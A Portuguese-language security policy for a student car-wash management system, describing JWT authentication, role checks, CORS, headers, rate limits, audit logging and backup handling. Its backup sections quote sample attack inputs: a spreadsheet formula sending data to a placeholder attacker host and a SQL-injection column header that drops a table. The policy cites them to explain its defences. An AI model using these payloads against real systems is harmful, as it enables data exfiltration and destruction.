# Wash Wizard — Política de Segurança

> **Versão:** 3.1
> **Última atualização:** 2026-10-29
> **Escopo:** Projeto Integrador UNIVESP — Engenharia de Computação

---

## 1. Visão Geral

Este documento descreve a arquitetura de segurança implementada no sistema Wash Wizard. O backend (Node.js/Express) é a fronteira de confiança: toda autenticação, autorização e validação de dados é aplicada e reforçada ali — o frontend é tratado como não confiável, nunca como a única linha de defesa.

### 1.1 Princípios de Segurança

- **Defesa em profundidade:** múltiplas camadas de proteção (autenticação, autorização, validação de entrada, headers de segurança, sanitização de erros)
- **Mínimo privilégio:** usuários têm acesso apenas ao necessário para seu papel; dados sensíveis não saem do servidor nem para o próprio admin (ver 7.1)
- **Validação no cliente e no servidor:** o frontend valida por UX, mas o backend é quem decide — nenhuma validação de negócio depende só do cliente
- **Integridade referencial:** foreign keys no banco de dados, verificadas também na importação de backup
- **Falha segura:** configuração inválida em produção impede o servidor de subir, em vez de degradar silenciosamente (ver 2.2)
- **Rastreabilidade:** alterações em valores financeiros ficam registradas em trilha de auditoria (ver 8)

---

## 2. Autenticação (JWT)

### 2.1 Arquitetura

O backend emite e valida os tokens de sessão — não há autenticação simulada no cliente.

```
┌──────────┐   POST /api/auth/login    ┌─────────────┐   token JWT   ┌──────────┐
│ Frontend │ ───(email, senha)───────> │   Backend   │ ─────────────>│ Frontend │
└──────────┘                           │ (bcrypt +   │               └──────────┘
                                        │  JWT sign)  │                    │
                                        └─────────────┘                    │
                                                                            v
                                                            Authorization: Bearer <token>
                                                            em toda chamada subsequente
```

- **Login:** `POST /api/auth/login` recebe `{ email, senha }`, busca o usuário pelo e-mail e compara a senha com `password_hash` (bcrypt) armazenado em `users`. Se válido, assina um JWT (`jsonwebtoken`) contendo `{ id, email, role }`.
- **Expiração:** o token expira em 8 horas (`JWT_EXPIRES_IN` em `backend/config.js`).
- **Algoritmo:** tanto `jwt.sign` quanto `jwt.verify` declaram `algorithms: ['HS256']` explicitamente (`JWT_ALGORITHM` em `backend/config.js`). Isso rejeita tokens com `alg: "none"` e fecha a classe de ataques de confusão de algoritmo caso o projeto migre para chaves assimétricas.
- **Segredo:** `JWT_SECRET` vem de `backend/.env` e é validado na inicialização — ver 2.2.
- **Sessão no frontend:** o token é guardado em `localStorage` (`t10_token`). Ao carregar a aplicação, o frontend chama `GET /api/auth/me` com o token salvo para revalidar a sessão no servidor antes de considerar o usuário autenticado — não confia apenas no que está salvo localmente.
- **Logout:** remove o token do `localStorage`. Não há invalidação de token no servidor (JWT é stateless); a expiração de 8h é o limite superior de uma sessão comprometida.

### 2.2 Validação do `JWT_SECRET` na inicialização

`backend/config.js` valida o segredo antes de o servidor aceitar requisições:

| Situação | `NODE_ENV=production` | Desenvolvimento |
|---|---|---|
| `JWT_SECRET` ausente | **`throw` — servidor não sobe** | Aviso + segredo aleatório temporário |
| Menor que 32 caracteres | **`throw`** | Aviso + segredo temporário |
| Igual ao valor de `.env.example` | **`throw`** | Aviso + segredo temporário |

A falha em produção é deliberadamente fatal. Um segredo gerado em memória faria cada processo de um cluster (`pm2`, múltiplas instâncias serverless) assinar com uma chave diferente, e um token emitido por um worker seria rejeitado por outro — sessões aleatoriamente inválidas, sintoma difícil de diagnosticar. É preferível não iniciar.

Para gerar um segredo adequado:

```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

### 2.3 Middleware de Autenticação e Autorização

Implementado em `backend/middleware/auth.js`:

```javascript
requireAuth(req, res, next)   // Exige um JWT válido no header Authorization; popula req.user
requireAdmin(req, res, next)  // Exige req.user.role === 'admin' (usado após requireAuth)
```

`requireAuth` é aplicado a **todas** as rotas de `/api/*`, exceto `POST /api/auth/login` (rota de login, necessariamente pública). `requireAdmin` é aplicado individualmente às rotas administrativas (ver matriz na seção 3).

**Revogação imediata de privilégio.** `requireAdmin` não confia no claim `role` do token: ele consulta o banco (`SELECT role FROM users WHERE id = ?`) e confirma que o usuário **ainda existe** e **ainda é admin**. Sem isso, como o JWT é stateless e vale 8 horas, um admin rebaixado ou removido manteria acesso administrativo total — incluindo `POST /api/backup/reset` — até o token expirar. O custo é uma consulta por chave primária, apenas nas rotas administrativas.

| Evento | Efeito no token já emitido |
|---|---|
| Usuário rebaixado a `operador` | Rotas admin passam a responder **403** imediatamente |
| Usuário removido do banco | Rotas admin passam a responder **401** imediatamente |

Toda gravação no banco usa `req.user.id` (extraído do token validado) para o campo `user_id` — nenhuma rota confia em um `user_id` enviado no corpo da requisição, o que impediria um usuário autenticado de forjar ações em nome de outro.

---

## 3. Controle de Acesso (RBAC)

### 3.1 Perfis de Usuário

| Perfil | Descrição | Permissões |
|--------|-----------|------------|
| **admin** | Administrador do sistema | Acesso total a todas as funcionalidades |
| **operador** | Funcionário operacional | Acesso restrito às funcionalidades do dia-a-dia |

```typescript
// frontend/src/contexts/AuthContext.tsx
export type UserRole = 'admin' | 'operador';
export interface AppUser {
  id: string;
  nome: string;
  email: string;
  role: UserRole;
}
```

### 3.2 Matriz de Permissões

O controle é reforçado **nas duas pontas**: o frontend esconde/bloqueia rotas por papel (`ProtectedRoute adminOnly` em `App.tsx`), e o backend aplica `requireAdmin` nos mesmos endpoints — um usuário `operador` não consegue contornar a restrição chamando a API diretamente.

| Recurso | Rota(s) da API | admin | operador |
|---------|-----------------|:-----:|:--------:|
| Dashboard Analítico & BI | `GET /api/dashboard/stats` | ✓ | ✓ |
| Clientes, Veículos, Lavagens (listar/criar/editar/excluir) | `/api/clientes*`, `/api/veiculos*`, `/api/lavagens*` | ✓ | ✓ |
| Tipos de Lavagem (criar/editar/excluir) — leitura é liberada para todos | `POST/PUT/DELETE /api/tipos-lavagem*` | ✓ | ✗ |
| Estoque (produtos) — leitura é liberada para todos | `POST/PUT/DELETE /api/produtos*` | ✓ | ✗ |
| Movimentações de estoque | `POST /api/movimentacoes` | ✓ | ✗ |
| Normalização de placas | `POST /api/veiculos/migrate-plates` | ✓ | ✗ |
| Gestão de usuários | `GET/POST /api/users` | ✓ | ✗ |
| Backup/Restore | `/api/backup/export`, `/api/backup/import`, `/api/backup/reset` | ✓ | ✗ |

> Nota de escopo: este é um sistema de um único lava-rápido, não multi-tenant — toda a equipe autenticada compartilha intencionalmente a mesma base de clientes/veículos/lavagens/produtos. RBAC aqui controla **o que cada papel pode fazer**, não isolamento de dados por usuário.

### 3.3 Integridade e Blindagem dos Indicadores Analíticos (BI)

O módulo de Business Intelligence (`GET /api/dashboard/stats`) segue regras estritas de integridade relacional para assegurar precisão contábil e operacional:

- **Filtro Estrito por Status:** Todas as métricas de receita (faturamento semanal, faturamento por serviço e ticket médio) filtram exclusivamente lavagens com `status = 'concluida'`. Lavagens com status `pendente`, `em_progresso` ou `cancelada` são sumariamente expurgadas das agregações financeiras para prevenir qualquer distorção no caixa.
- **Isolamento de Datas no Servidor:** As comparações temporais (semana atual vs. semana anterior, radar de ausência > 30 dias e runway de estoque) utilizam funções canônicas do PostgreSQL (`NOW() - INTERVAL`, `EXTRACT(EPOCH ...)`), prevenindo adulterações de data enviadas pelo cliente.
- **Proteção contra Divisão por Zero:** Todas as métricas derivadas (Ticket Médio, Variação %, Taxa de Recorrência e Runway) utilizam estruturas de fallback e `NULLIF` no SQL/JS, garantindo respostas estáveis mesmo em bases recém-inicializadas ou zeradas.

---

## 4. Segurança de Rede

### 4.1 Política de CORS

O backend aceita requisições apenas da origem configurada em `FRONTEND_URL` (`backend/.env`). Nenhuma outra origem recebe os headers `Access-Control-Allow-Origin` necessários para que um navegador libere a leitura da resposta — isso impede que uma página maliciosa hospedada em outro domínio use o token de um usuário logado para chamar a API em nome dele (CSRF via fetch/XHR).

| Origem da requisição | Desenvolvimento | Produção |
|---|---|---|
| Igual a `FRONTEND_URL` | Permitida | Permitida |
| `localhost` / `127.0.0.1` em qualquer porta | Permitida (proxy do Vite) | Bloqueada |
| Sem header `Origin` (curl, same-origin) | Permitida | **Bloqueada** |
| Qualquer outra | Bloqueada (**403**) | Bloqueada (**403**) |

- **`FRONTEND_URL` é obrigatório em produção.** Sem ele o servidor lança exceção na inicialização, em vez de cair silenciosamente para `localhost` — o que faria o deploy parecer uma falha de rede.
- Origem sem header `Origin` é bloqueada em produção para fechar antecipadamente o vetor de CSRF, caso o token venha a migrar de `localStorage` para cookie.
- Uma origem bloqueada recebe **403 com mensagem limpa** (`Origem não permitida.`), e não o 500 com stack trace do handler default do Express.

### 4.2 Headers de Segurança (Helmet)

`helmet` está ativo em todas as respostas, e `X-Powered-By` é removido (`app.disable('x-powered-by')`) para não entregar fingerprint da stack.

| Header | Valor | Protege contra |
|---|---|---|
| `Content-Security-Policy` | `default-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'` | XSS, injeção de recurso externo, clickjacking |
| `X-Frame-Options` | `DENY` | Clickjacking (ex: iframe invisível sobre "Resetar Banco") |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing (CSV de backup interpretado como HTML) |
| `Referrer-Policy` | `no-referrer` | Vazamento de URL interna para terceiros |
| `Strict-Transport-Security` | 1 ano, `includeSubDomains` (só em produção) | Downgrade para HTTP |

> `style-src` inclui `'unsafe-inline'` porque o Recharts injeta um `<style>` dinâmico. Os valores desse style passam por uma allowlist estrita de cores CSS em `frontend/src/components/ui/chart.tsx` — ver 5.4.

### 4.3 Rate Limiting

`express-rate-limit` limita requisições por IP. `app.set('trust proxy', 1)` garante que, atrás de um reverse proxy, o contador use o IP real do cliente e não o do proxy.

| Escopo | Limite | Janela | Observação |
|---|---|---|---|
| `POST /api/auth/login` | 10 tentativas | 15 min | `skipSuccessfulRequests` — logins bem-sucedidos não consomem a cota |
| `/api/*` (geral) | 300 requisições | 1 min | Teto geral contra abuso e exaustão do event loop |

Sem esse controle, o único freio contra força bruta seria o custo do bcrypt (~80 ms), o que ainda permitiria centenas de tentativas por segundo com requisições paralelas. Excedido o limite, a resposta é **429** com mensagem em português.

### 4.4 Limites de Payload

| Vetor | Limite | Resposta ao exceder |
|---|---|---|
| Corpo JSON | 200 KB | **413** |
| Arquivo CSV de backup | 5 MB por arquivo | **413** |
| Quantidade de arquivos por import | 7 (um por tabela) | **400** |
| Campos de texto no multipart | 0 | **400** |

`multer` usa `memoryStorage`: sem esses limites, um único upload carregaria gigabytes na RAM e derrubaria o processo Node por OOM. O `fileFilter` também rejeita qualquer arquivo cujo nome não corresponda exatamente a `<tabela>.csv` da allowlist — o que, somado ao `memoryStorage` (que nunca escreve em disco), elimina Path Traversal e Zip Slip.

### 4.5 Política de Cache

Toda resposta de `/api/*` é marcada como não-cacheável, por um middleware registrado **antes das rotas** (`backend/server.js`):

```http
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
Expires: 0
```

| Diretiva | Para que serve aqui |
|---|---|
| `no-store` | Impede que a resposta seja gravada em disco ou memória pelo navegador |
| `no-cache` + `must-revalidate` | Obriga revalidação no servidor antes de reexibir qualquer cópia |
| `private` | Barra cache em proxy compartilhado (incluindo a camada de borda da Vercel) |
| `Pragma` / `Expires` | Cobre intermediários HTTP/1.0 que ignoram `Cache-Control` |

O motivo é operacional, não teórico: as listagens trazem nome, telefone, data de nascimento e histórico financeiro de clientes, e o computador do balcão é compartilhado entre turnos. Sem `no-store`, o botão "voltar" do navegador reexibe a tela de clientes **depois do logout**, porque a resposta ainda está no cache local — tratamento de dado pessoal sem base legal nem titular presente.

O middleware é aplicado ao prefixo `/api` inteiro, de propósito: a API não tem nenhum conteúdo público cacheável a perder, e assim **toda rota nova nasce protegida**, em vez de depender de alguém lembrar de adicionar o cabeçalho.

---

## 5. Validação de Entrada

### 5.1 Backend (autoridade final)

O backend valida e rejeita entradas inválidas com `400` antes de tocar no banco, em vez de deixar a constraint do PostgreSQL estourar como erro genérico:

| Recurso | Validações aplicadas |
|---|---|
| Usuários | `email` obrigatório e com formato válido; unicidade verificada (**409**); senha com mínimo de 10 caracteres; `role` restrito a `admin`/`operador` |
| Clientes | `nome` obrigatório; `telefone` com 10 ou 11 dígitos, preservando a formatação enviada pela UI |
| Veículos | `cliente_id` obrigatório e **existente** no banco; `modelo` obrigatório; `placa` validada contra os formatos aceitos e normalizada para maiúsculas sem separadores |
| Tipos de lavagem | `nome` obrigatório; `preco` numérico e ≥ 0 |
| Produtos | `nome` obrigatório; `quantidade`, `estoque_minimo` e `preco_unitario` numéricos e ≥ 0 |
| Lavagens | `cliente_id`, `veiculo_id`, `tipo_lavagem_id` obrigatórios; `status` restrito ao enum (`pendente`, `em_progresso`, `concluida`, `cancelada`); `valor` numérico e ≥ 0 |
| Movimentações de estoque | `tipo` restrito a `entrada`/`saida`; `quantidade` numérica e > 0; saída bloqueada se maior que o estoque disponível |
| Import de backup (CSV) | Nome de cada coluna do cabeçalho validado contra uma allowlist por tabela antes de compor a query `INSERT` (ver seção 7.2) |

Todo campo de texto passa por `limparTexto`, que remove caracteres de controle (`\u0000`–`\u001F`, `\u007F`), normaliza em NFC e aplica um limite de tamanho por campo. Rotas de `PUT` verificam a existência do recurso e respondem **404** em vez de devolver `null` silenciosamente.

As `CHECK` constraints do PostgreSQL (`valor >= 0`, `quantidade >= 0`, `role IN (...)`) permanecem como segunda camada. A validação na aplicação existe para que uma entrada inválida gere **400 com mensagem útil**, e não um **500** genérico — o que mascararia erro de cliente como falha de servidor e poluiria os logs, dificultando detectar um ataque real.

`data_conclusao` de uma lavagem nunca é aceita do cliente — é preenchida automaticamente pelo servidor no momento em que o `status` muda para `concluida`.

### 5.2 Máscaras de Input (Frontend)

**Telefone:** `(XX) XXXXX-XXXX` — `frontend/src/hooks/useTelefoneMask.ts`
**Placa de Veículo:** aceita padrões Mercosul (`ABC1D23`) e Antigo (`ABC1234`) — `frontend/src/hooks/usePlacaMask.ts`

### 5.3 Prevenção de XSS

A proteção contra XSS vem de três camadas, nenhuma delas um escape manual de HTML:

1. **Escape automático do React.** Todo conteúdo interpolado em JSX é escapado pelo próprio React. Não existe função de escape manual no frontend **de propósito**: escapar antes de gravar causaria double-encoding, e o usuário veria `João &#x27;Zé&#x27;` na tela em vez do nome.
2. **Sanitização no servidor.** `limparTexto` remove caracteres de controle e limita tamanho em toda entrada persistida (ver 5.1).
3. **Content-Security-Policy.** `script-src 'self'` e `object-src 'none'` impedem a execução de script injetado mesmo que alguma camada anterior falhe (ver 4.2).

> Versões anteriores deste documento descreviam uma função `sanitizeInput()` em `frontend/src/utils/security.ts`. Ela foi **removida**: não era importada em nenhum arquivo do projeto, de modo que documentá-la como controle ativo dava falsa garantia numa auditoria. O arquivo hoje mantém apenas a chave de storage do token e validadores de formato para UX, com a autoridade final no backend.

### 5.4 Allowlist de cores no gráfico

`frontend/src/components/ui/chart.tsx` injeta um `<style>` via `dangerouslySetInnerHTML` para expor as cores das séries como variáveis CSS. Os valores passam por uma allowlist estrita (`#hex`, `rgb()/rgba()`, `hsl()/hsla()`, `var(--token)` ou nome de cor), e o identificador do gráfico é reduzido a `[A-Za-z0-9_-]`.

Filtrar apenas `<` e `>` não bastaria: um `}` fecharia a regra CSS e permitiria sobrescrever estilos arbitrários da página (*UI redressing*). Hoje as cores vêm de configuração em código, não de entrada do usuário — a allowlist existe para que isso continue seguro caso passem a vir do banco ou da URL.

---

## 6. Proteção de Dados

### 6.1 Senhas

Senhas nunca são armazenadas em texto plano. `users.password_hash` guarda o hash gerado por `bcryptjs` (fator de custo 10). A rota `GET /api/users` seleciona explicitamente as colunas públicas (nunca `SELECT *`), garantindo que o hash jamais é incluído em uma resposta da API.

### 6.2 Banco de Dados PostgreSQL (Supabase)

O banco é gerenciado pelo Supabase e **nunca é versionado** — o que vai para o repositório é o schema (`backend/schema.postgres.sql`), a definição de código necessária para inicializar um ambiente do zero. A conexão usa a `DATABASE_URL` mantida em `backend/.env` (gitignored), com TLS habilitado para hosts remotos.

**Estrutura de segurança:**
- Integridade referencial garantida pelas FKs do PostgreSQL, com índice em toda coluna de FK
- `CHECK` constraints no schema para enums (`status`, `role`, `tipo`) e valores não-negativos (`valor`, `quantidade`, `preco`)
- Erros de integridade (`23503`, `23505`, `23514`, `22P02`) mapeados para `400`/`409`, sem vazar detalhe do banco ao cliente
- Transações para operações críticas (ver seção 6.3)

### 6.3 Transações e Condições de Corrida

A movimentação de estoque (`POST /api/movimentacoes`) envolve ler o estoque atual, calcular o novo valor e gravar — uma sequência clássica sujeita a *lost update* se duas requisições concorrentes lerem o mesmo valor antes de qualquer uma escrever. A rota executa a leitura com `SELECT ... FOR UPDATE`, a atualização do produto e a inserção da movimentação dentro de uma transação (`withTransaction`), travando a linha do produto até o `COMMIT`.

Com o `Pool` do `pg`, cada requisição usa a sua própria conexão; as movimentações concorrem livremente e o `FOR UPDATE` as serializa apenas quando disputam o mesmo produto. Import e reset de backup, que apagam a base inteira, continuam serializados entre si por uma fila de promises (`emTransacaoSerializada`).

Verificado em teste: 20 saídas simultâneas de 5 unidades sobre o mesmo produto resultam em 20 respostas **200** e saldo final exatamente igual ao esperado.

### 6.4 Schema de Relacionamentos

```
users (1) ──── (N) clientes (1) ──── (N) veiculos (1) ──── (N) lavagens
  │                                          │
  │                                          │
  └────────────────── (N) produtos (1) ──── (N) movimentacoes
        │
        └──────────── (N) tipos_lavagem
```

### 6.5 Minimização de Dados nas Respostas (LGPD, Art. 6º, III)

Nenhum endpoint usa `SELECT *`. Cada rota declara a lista nominal de colunas que devolve, em `COLUNAS_API` (`backend/server.js`):

| Endpoint | Colunas devolvidas |
|---|---|
| `/api/clientes` | `id, nome, telefone, data_nascimento, created_at` |
| `/api/veiculos` | `id, cliente_id, modelo, placa, cor, marca` |
| `/api/tipos-lavagem` | `id, nome, descricao, preco` |
| `/api/lavagens` | `id, cliente_id, veiculo_id, tipo_lavagem_id, status, valor, data, pagamento, observacao, data_conclusao` |
| `/api/produtos` | `id, nome, categoria, quantidade, estoque_minimo, unidade, preco_unitario` |
| `/api/movimentacoes` | `id, produto_id, tipo, quantidade, data` |

O ganho imediato é modesto — saem `user_id`, `created_at` e a observação interna da movimentação. O ganho que importa é estrutural: com a lista nominal, **uma coluna nova e sensível não passa a trafegar sozinha** para o navegador só porque foi adicionada ao schema. Um `cpf` acrescentado à tabela `clientes` amanhã continua no banco até que alguém decida, explicitamente, publicá-lo.

A mesma lista vale para o retorno de linha única de `POST`/`PUT`, porque o `AppContext` do frontend funde a resposta na linha já carregada (`{...antiga, ...resposta}`) — dois shapes diferentes deixariam a mesma lista inconsistente após uma edição.

**Duas exceções deliberadas:**

- **Snapshot da trilha de auditoria** (`auditarExclusaoLavagens`) usa `SELECT *`: é o retrato forense da linha que vai deixar de existir, e enxugar colunas ali destruiria justamente a prova que a auditoria exige. O snapshot nunca sai por uma rota de listagem.
- **`telefone` e `data_nascimento` permanecem na listagem de clientes.** Nenhuma tela busca cliente por id — `EditarCliente.tsx` e `ClienteDetalhe.tsx` leem da listagem compartilhada do `AppContext` —, então omiti-los faria o formulário de edição abrir em branco e **sobrescrever o valor gravado** no próximo salvamento. Reduzir isso de verdade exige primeiro um endpoint de detalhe consumido pelo frontend (ver 11).

---

## 7. Backup e Restore

### 7.1 Exportação CSV

`GET /api/backup/export` (admin) exporta todas as tabelas em CSV, na ordem `users → clientes → veiculos → tipos_lavagem → produtos → lavagens → movimentacoes`, encoding UTF-8.

**Hashes de senha nunca são exportados.** A exportação usa uma allowlist de colunas (`EXPORT_COLUMNS`) e a tabela `users` sai apenas com `id, email, nome, role, created_at` — `password_hash` é deliberadamente omitido:

```javascript
// backend/server.js
const EXPORT_COLUMNS = {
  ...TABLE_COLUMNS,
  users: ['id', 'email', 'nome', 'role', 'created_at'],  // sem password_hash
};
const rows = await all(`SELECT ${EXPORT_COLUMNS[table].join(', ')} FROM ${table}`);
```

Um arquivo de backup circula por pasta de Downloads, e-mail e pendrive. Com os hashes bcrypt em mãos, um atacante faria cracking offline ilimitado — sem rate limiting e sem deixar rastro nos logs — contra senhas potencialmente fracas.

**Proteção contra CSV / Formula Injection.** Toda célula de texto exportada passa por `sanitizeCsvCell`, que prefixa com apóstrofo qualquer valor iniciado por `=`, `+`, `-`, `@`, tab ou CR:

```javascript
const CSV_GATILHOS_FORMULA = /^[=+\-@\t\r]/;
function sanitizeCsvCell(valor) {
  if (typeof valor !== 'string') return valor;
  return CSV_GATILHOS_FORMULA.test(valor) ? `'${valor}` : valor;
}
```

Sem isso, um operador poderia cadastrar um cliente chamado `=HYPERLINK("http://evil.tld/?x="&A1,"Clique")`. Ao abrir o backup no Excel ou LibreOffice, o admin executaria a fórmula: `HYPERLINK` e `WEBSERVICE` exfiltram a planilha — incluindo telefones de clientes, dado pessoal sob a LGPD — e DDE pode executar comando local. O vetor atravessa a fronteira de privilégio operador → admin. O apóstrofo mantém o valor legível e é removido na releitura, de modo que o round-trip export → import continua fiel.

### 7.2 Importação com Integridade e Prevenção de SQL Injection

```javascript
// backend/server.js
const TABLE_COLUMNS = {
  clientes: ['id', 'user_id', 'nome', 'telefone', 'created_at'],
  // ...allowlist por tabela...
};

app.post('/api/backup/import', requireAdmin, upload.any(), async (req, res) => {
  // ...
  const columns = Object.keys(records[0]);
  const colunasInvalidas = columns.filter(c => !TABLE_COLUMNS[table].includes(c));
  if (colunasInvalidas.length > 0) {
    throw new Error(`Colunas inválidas em ${table}.csv: ${colunasInvalidas.join(', ')}`);
  }
  const sql = `INSERT INTO ${table} (${columns.join(', ')}) VALUES (${placeholders})`;
  // ...
});
```

O nome das colunas do CSV importado **não pode** ser passado para valores parametrizados (`?`/`$n`), pois nomes de coluna fazem parte da estrutura da query, não de seus valores — por isso, antes deste controle, um cabeçalho de CSV malicioso (ex: `telefone); DROP TABLE clientes;--`) seria concatenado diretamente na query `INSERT`. Cada coluna do cabeçalho é validada contra uma allowlist fixa por tabela antes de montar a query; qualquer coluna fora da lista rejeita o import inteiro e reverte a transação (`ROLLBACK`), sem tocar o banco.

A rota inteira exige `requireAdmin` — importar ou resetar o banco não é uma operação de usuário comum.

#### Senhas provisórias na restauração

A allowlist de importação (`IMPORT_COLUMNS`) também omite `password_hash`: aceitar um hash vindo do arquivo permitiria injetar uma credencial escolhida pelo atacante, ou revalidar credenciais de outra instalação ao restaurar um backup de terceiros. Cada usuário restaurado recebe uma **senha provisória aleatória** (`crypto.randomBytes(9).toString('base64url')`), devolvida ao admin no corpo da resposta:

```json
{
  "success": true,
  "records": 241,
  "senhas_temporarias": [
    { "email": "admin@washwizard.com", "senha_temporaria": "3UvVxbGX5E2G" }
  ]
}
```

A tela de Configurações exibe essas senhas **uma única vez**, em um painel de alerta, e suprime o reload automático da página enquanto elas estiverem visíveis — sem isso o próprio admin ficaria trancado fora do sistema após restaurar `users.csv`.

#### Verificação de integridade referencial

O import apaga e reinsere as tabelas em ordem de dependência (pais antes dos filhos no INSERT, o inverso no DELETE). Antes do `COMMIT`, com a transação ainda aberta, o PostgreSQL valida cada FK linha a linha no próprio `INSERT`; uma referência órfã (ex: uma lavagem apontando para um cliente ausente do arquivo) dispara o SQLSTATE `23503`, que o servidor converte em **400** (`Backup inconsistente`) e desfaz a transação inteira — em vez de corromper o banco de forma permanente e silenciosa. Órfãos fariam os `JOIN` do dashboard de BI omitirem dados sem qualquer erro visível.

> **Consequência operacional:** a importação passou a exigir um **conjunto consistente** de CSVs. Importar apenas `clientes.csv`, por exemplo, apagaria os clientes atuais e deixaria as lavagens existentes órfãs — isso agora é detectado e rejeitado. O fluxo suportado é exportar e reimportar os 7 arquivos juntos, que é o que a tela de Configurações faz.

#### Serialização das transações

As rotas que abrem transação usam `withTransaction`, que reserva um client dedicado do pool. Import e reset — que apagam a base inteira — são adicionalmente serializados entre si por uma fila de promises (`emTransacaoSerializada`), porque dois imports simultâneos apagariam e reinseririam os dados ao mesmo tempo. As movimentações de estoque não precisam da fila: o `SELECT ... FOR UPDATE` serializa apenas as que disputam o mesmo produto.

### 7.3 Ordem de Dependências

```
1. users (sem dependências)
2. tipos_lavagem (sem dependências)
3. clientes (depende de users)
4. produtos (depende de users)
5. veiculos (depende de clientes)
6. lavagens (depende de clientes, veiculos, tipos_lavagem)
7. movimentacoes (depende de produtos)
```

---

## 8. Trilha de Auditoria Financeira

Qualquer usuário autenticado pode editar uma lavagem, inclusive de meses anteriores. Sem registro, reduzir o `valor` de uma lavagem antiga é indistinguível de um lançamento legítimo — e o dashboard de BI, que soma `valor` diretamente, exibiria números internamente consistentes com a alteração, tornando-a invisível.

A tabela `auditoria_lavagens` (`backend/schema.postgres.sql`) registra, de forma *append-only*, toda mudança em `valor`, `pagamento` ou `status`:

| Coluna | Conteúdo |
|---|---|
| `id` | UUID do registro de auditoria |
| `lavagem_id` | Lavagem alterada (sem FK, para a trilha sobreviver ao DELETE) |
| `user_id` | Quem alterou — sempre `req.user.id` do token validado |
| `acao` / `dados_anteriores` / `dados_novos` | Formato do schema provisionado (snapshot completo em `jsonb`) |
| `campo` | `valor`, `pagamento` ou `status` |
| `valor_anterior` / `valor_novo` | Estado antes e depois |
| `data` | `TIMESTAMPTZ`, devolvido como ISO 8601 UTC |

O app grava **os dois formatos** na mesma linha (colunas de snapshot e colunas de campo), preservando o contrato antigo e o backup CSV. O registro é gravado em `PUT /api/lavagens/:id`, apenas quando o valor efetivamente muda — reenviar o mesmo valor não gera ruído na trilha. A lavagem é lida antes do `UPDATE`, e uma lavagem inexistente responde **404**.

Note que `user_id` na tabela `lavagens` identifica quem **criou** o registro; a autoria de cada **alteração** posterior vive somente na trilha de auditoria.

### 8.1 Provisionamento e migrações do schema

O schema vive em `backend/schema.postgres.sql` e é aplicado explicitamente com `npm run db:schema` (idempotente: `CREATE TABLE IF NOT EXISTS`, `CREATE INDEX IF NOT EXISTS`). Mudanças que precisam atingir bancos já em uso são versionadas como migrações aditivas em `backend/migrations/` e aplicadas com `npm run db:migrate`. O servidor apenas verifica a conexão (`SELECT 1` via `dbReady`) no boot — não altera estrutura em produção.

---

## 9. Sanitização de Erros

Nenhuma resposta de erro (`500`) expõe a mensagem interna do driver PostgreSQL ao cliente:

```javascript
// backend/server.js
function handleServerError(res, err) {
  console.error(sanitizarErroParaLog(err));               // diagnóstico sem dado pessoal (ver 9.2)
  res.status(500).json({ error: 'Erro interno do servidor' }); // mensagem genérica ao cliente
}
```

Isso evita vazar detalhes de schema, nomes de tabela/coluna ou stack traces que ajudariam um atacante a mapear a estrutura do banco a partir de respostas de erro.

### 9.1 Error Handler Global

Registrado **depois de todas as rotas**, converte as exceções que antes caíam no handler default do Express (que responde 500 com stack trace fora de produção) em respostas limpas:

| Origem do erro | Status | Corpo |
|---|---|---|
| `multer` `LIMIT_FILE_SIZE` | **413** | Arquivo de backup muito grande (limite 5 MB) |
| `multer` (outros limites, `fileFilter`) | **400** | Upload inválido |
| Corpo JSON acima de 200 KB (`entity.too.large`) | **413** | Corpo da requisição muito grande |
| JSON malformado (`SyntaxError`) | **400** | JSON inválido |
| Origem bloqueada pelo CORS | **403** | Origem não permitida |
| `ValidacaoError` | **400** / **404** / **409** | Mensagem específica do campo |
| Qualquer outra exceção | **500** | `Erro interno do servidor` (detalhe só no log) |

A classe `ValidacaoError` carrega `status` e `clientMessage`, de forma que o que chega ao cliente é sempre uma string escolhida deliberadamente — nunca a mensagem de uma exceção interna.

### 9.2 Sanitização de Logs (LGPD, Art. 6º, VII e VIII)

Esconder o detalhe do erro do cliente não basta se ele reaparece no log do provedor. O `DatabaseError` do `pg` carrega campos que embutem o **valor** da linha que falhou:

```
detail: 'Key (email)=(maria@exemplo.com) already exists.'
```

Logar o objeto de erro inteiro publicava esse valor no log do Render — dado pessoal persistido fora do banco, em um sistema sem política de retenção para log. `backend/log-seguro.js` resolve isso com `sanitizarErroParaLog(err)`, usado em `handleServerError`, em `responderErroBanco` e nos dois `catch` de `backend/middleware/auth.js`:

| Campo | Vai para o log? | Por quê |
|---|---|---|
| `name`, `message`, `code`, `constraint`, `table`, `column`, `routine`, `schema` | **Sim** | Identificam onde quebrou. A `message` do `pg` nomeia a constraint violada, nunca o valor |
| `stack` | **Sim** | É código do servidor, não dado do titular |
| `detail`, `where` | **Não** | Embutem o valor da linha (e-mail, telefone, nome) |
| `query`, `internalQuery`, `parameters` | **Não** | Carregam o texto da consulta e os valores enviados |

Logs mantidos de propósito, por não conterem dado pessoal: metadados de upload do `multer`, a origem rejeitada pelo CORS, e o `.message` das falhas de conexão do pool.

Nenhum ponto do backend loga `req.body`, senha ou token — verificado na auditoria e coberto por regressão em `backend/test/privacidade-lgpd.test.js`, que força uma violação de unicidade real e falha se o e-mail conflitante aparecer na saída do `console`.

---

## 10. Notificações de Segurança (Aplicação)

### 9.1 Alertas de Estoque Baixo

```typescript
// frontend/src/pages/Movimentacao.tsx
if (novoEstoque <= estoqueMinimo && tipo === 'saida') {
  toast.warning(`⚠️ Estoque baixo: ${produto?.nome} agora tem ${novoEstoque} ${produto?.unidade}`);
}
```

### 9.2 Toast Notifications

O sistema utiliza `sonner` para feedback visual de sucesso, erro e alertas de estoque.

---

## 11. Limitações Conhecidas e Fora de Escopo

Este é um sistema de porte acadêmico com um backend real de autenticação/autorização — as limitações abaixo são deliberadas para este escopo, não lacunas de segurança não tratadas:

- **HTTPS:** não configurado neste repositório; é responsabilidade do ambiente de deploy (reverse proxy com TLS). O `Strict-Transport-Security` já é emitido quando `NODE_ENV=production`.
- **Token em `localStorage`:** o JWT fica acessível a qualquer JavaScript da origem, então um XSS permitiria roubo de sessão por até 8h. A CSP (4.2) reduz a superfície, mas a mitigação definitiva é migrar para cookie `httpOnly` + `SameSite=Strict` — o CORS já está endurecido para suportar essa migração (4.1).
